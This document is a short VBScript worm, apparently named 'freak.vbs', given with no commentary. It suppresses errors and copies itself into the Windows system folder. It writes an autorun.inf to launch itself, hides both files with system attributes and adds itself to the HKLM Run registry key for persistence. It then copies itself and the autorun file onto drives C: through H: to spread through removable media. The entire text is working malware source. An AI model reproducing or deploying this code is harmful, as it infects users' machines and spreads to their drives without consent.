On Error Resume Next
Msgbox "***ONE TREE HILL***"
Set reg=CreateObject("WScript.Shell")
Set files=CreateObject("Scripting.FileSystemObject")
Set sys=files.GetSpecialFolder(1)
files.CopyFile "./freak.vbs", sys & "\freak.vbs"
Set tex=files.CreateTextFile(sys & "\autorun.inf")
tex.WriteLine "[autorun]"
tex.WriteLine "shellexecute=freak.vbs"
Set hide=files.GetFile(sys & "\freak.vbs")
Set hide_=files.GetFile(sys & "\autorun.inf")
hide.Attributes=55
hide_.Attributes=55
reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Freak", sys & "\freak.vbs"
files.CopyFile sys & "\freak.vbs", "C:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "C:\autorun.inf"
files.CopyFile sys & "\freak.vbs", "D:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "D:\autorun.inf"
files.CopyFile sys & "\freak.vbs", "E:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "E:\autorun.inf"
files.CopyFile sys & "\freak.vbs", "F:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "F:\autorun.inf"
files.CopyFile sys & "\freak.vbs", "G:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "G:\autorun.inf"
files.CopyFile sys & "\freak.vbs", "H:\freak.vbs"
files.CopyFile sys & "\autorun.inf", "H:\autorun.inf"